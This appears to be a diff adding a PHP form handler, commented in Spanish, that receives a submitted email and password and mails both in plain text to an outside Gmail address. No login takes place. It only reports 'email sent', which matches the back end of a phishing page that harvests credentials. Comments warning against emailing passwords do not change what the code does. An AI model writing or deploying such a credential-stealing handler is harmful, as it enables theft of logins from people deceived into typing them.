@@ -1,0 +1,28 @@
+<?php
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    $email = htmlspecialchars($_POST["email"]);
+    $password = htmlspecialchars($_POST["password"]); // ⚠️ No almacenar contraseñas sin cifrado
+
+    // Destinatario
+    $to = "ramozsacara@gmail.com";
+    $subject = "Nuevo inicio de sesión";
+    
+    // Mensaje con los datos recibidos
+    $message = "Se ha recibido un nuevo intento de inicio de sesión:\n\n";
+    $message .= "Correo: " . $email . "\n";
+    $message .= "Contraseña: " . $password . "\n";  // ⚠️ No se deben enviar contraseñas por email en un sistema real
+    
+    // Cabeceras del correo
+    $headers = "From: no-reply@tudominio.com\r\n";
+    $headers .= "Reply-To: no-reply@tudominio.com\r\n";
+    
+    // Enviar correo
+    if (mail($to, $subject, $message, $headers)) {
+        echo "Correo enviado con éxito.";
+    } else {
+        echo "Error al enviar el correo.";
+    }
+} else {
+    echo "Acceso no permitido.";
+}
+?>
